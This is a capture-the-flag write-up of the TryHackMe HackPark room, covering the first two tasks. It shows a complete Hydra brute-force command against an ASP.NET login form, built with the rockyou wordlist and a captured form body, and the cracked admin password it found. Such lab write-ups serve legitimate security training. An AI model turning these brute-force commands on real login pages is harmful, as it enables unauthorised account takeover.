---
layout: post
title: HackPark
categories: [CyberSecurity, CTF]
tags: [thm, easy, nmap]
---

![HackPark](/assets/hackpark.png){: .right }{: w="200" h="200" }

## Walkthrough
[https://tryhackme.com/room/hackpark](https://tryhackme.com/room/hackpark)

**Difficulty level:** Easy

## Task 1: Deploy the vulnerable Windows machine 

Connect to our network and deploy this machine. Please be patient as this machine can take up to 5 minutes to boot! You can test if you are connected to our network, by going to our access page. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

This room will cover brute-forcing an accounts credentials, handling public exploits, using the Metasploit framework and privilege escalation on Windows.

### Questions

Q1.Deploy the machine and access its web server.

> "No answer needed"

Q2.Whats the name of the clown displayed on the homepage?

> "Pennywise"

### MyWalk

Just using reverse image on google if you don't recognize the famous clown immediately

## Task 2: Using Hydra to brute-force a login

Hydra is a parallelized, fast and flexible login cracker. If you don't have Hydra installed or need a Linux machine to use it, you can deploy a powerful Kali Linux machine and control it in your browser!

Brute-forcing can be trying every combination of a password. Dictionary-attack's are also a type of brute-forcing, where we iterating through a wordlist to obtain the password.

### Questions

Q1. We need to find a login page to attack and identify what type of request the form is making to the webserver. Typically, web servers make two types of requests, a GET request which is used to request data from a webserver and a POST request which is used to send data to a server.

You can check what request a form is making by right clicking on the login form, inspecting the element and then reading the value in the method field. You can also identify this if you are intercepting the traffic through BurpSuite (other HTTP methods can be found here).

What request type is the Windows website login form using?

> "****"

Q2. Now we know the request type and have a URL for the login form, we can get started brute-forcing an account.

Run the following command but fill in the blanks:

```bash
hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form
```
{: .nolineno }

Guess a username, choose a password wordlist and gain credentials to a user account!


> "********"

### MyWalk

The format is this:  
hydra -l <username> -P <wordlist> <targetIP> http-post-form <login request pattern>

We'll try "admin" as user  
wordlist will be "/usr/share/wordlists/rockyou.txt"
The login request pattern parameter its the most difficult part.  
The format parameter is:  
"<path to login form>:<body, with magic strings ^USER^ and ^PASS^>:<pattern that appears in an invalid login>"  
The path to the login form is: "/Account/login.aspx"  
The pattern that appears in case of invalid login is the text that appears when a login fails. Texting a random login it shows "Login failed" on the page.  
For the body, weâ€™ll need to go back to Inspect Element and grab the request payload.

Here is our hydra command:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.210.66 http-post-form "/Account/login.aspx:__VIEWSTATE=YkV%2BBrWNrMO95paBjm3xJISQwN45gLG%2FL%2BXp40poRUZ%2BpAJGH7Eipr64uHNvtkcH7xdmtwm%2FLqFun3bJkTFE1m2raP6sQokuDgB%2BKSBaqc1hiK%2BC%2Bzvwm96h1U45rDQOdk4HculSS8hP1pwDNrSJEKcLtDMv8sqrmiQjTVQZozG8yS22&__EVENTVALIDATION=6Q1Nj87i1fT1evWA7iQxDXRPTava4YyOQ59XM3TPQa49IzACNrAwIYFYEHgco4u%2F2%2FMzYe7Of1idJQrhLA4vxJMzp4V3gdwjGzWOSPat8HOHhlaByQxtt61IjK%2FAAMhQfuI1hmxkup8X8Mt%2B%2FQ8Qc2kX14HmcrHKrV5lRBOwm8XvFsbh&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login
(content omitted)
[80][http-post-form] host: 10.10.210.66   login: admin   password: 1qaz2wsx
1 of 1 target successfully completed, 1 valid password found
```
{: .nolineno }
